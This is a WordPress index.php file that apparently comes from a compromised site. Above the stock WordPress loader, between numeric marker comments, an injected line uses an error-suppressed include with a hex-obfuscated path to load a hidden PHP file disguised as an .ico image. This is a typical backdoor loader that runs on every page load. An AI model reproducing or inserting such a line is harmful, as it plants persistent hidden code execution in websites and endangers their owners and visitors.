<?php
/*75558*/

@include "\x2fhome\x2forol\x6ftto/\x70ubli\x63_htm\x6c/wp-\x69nclu\x64es/S\x69mple\x50ie/D\x65code\x2f.06b\x331ba8\x2eico";

/*75558*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
